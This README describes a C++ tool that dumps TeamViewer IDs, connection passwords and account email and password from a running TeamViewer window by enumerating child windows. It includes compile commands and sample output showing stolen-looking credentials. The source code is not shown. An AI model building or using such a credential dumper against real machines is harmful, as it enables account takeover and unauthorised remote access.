TeamViewer-dumper-in-CPP
======================

Dumps TeamViewer ID,Password and account settings from a running TeamViewer instance by enumerating child windows.


Compilation and requirements
======================

1. Compile with CL
  1. cl TeamViewerDump.cpp
  2. or with cl TeamViewerDump.cpp /EHsc
2. Requirements
  1. TeamViewer must be running
  2. Tested only with English GUI of TeamViewer

Sample output
======================

```
C:\tools\Projects>TeamViewer_Dump.exe
TeamViewer ID: 606 151 261
TeamViewer PASS: 3239
E-mail: hacked@account.com
Password: FooPassword123

C:\tools\Projects>
```
